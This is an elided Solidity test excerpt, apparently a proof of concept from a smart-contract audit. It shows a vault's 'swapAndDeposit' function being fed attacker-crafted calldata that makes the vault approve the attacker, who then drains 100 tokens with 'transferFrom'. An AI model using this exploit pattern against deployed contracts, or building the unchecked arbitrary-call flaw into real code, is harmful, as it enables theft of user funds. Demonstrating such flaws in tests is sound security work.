...
contract SwapAndDepositTest is Test {
    ...
    function test_SwapAndDeposit() public {
        ...
        bytes memory data = abi.encodeCall(ERC20.approve, (attacker, 100));
        vault.swapAndDeposit(address(token), 0, address(token), data);
        token.transferFrom(address(vault), attacker, 100);
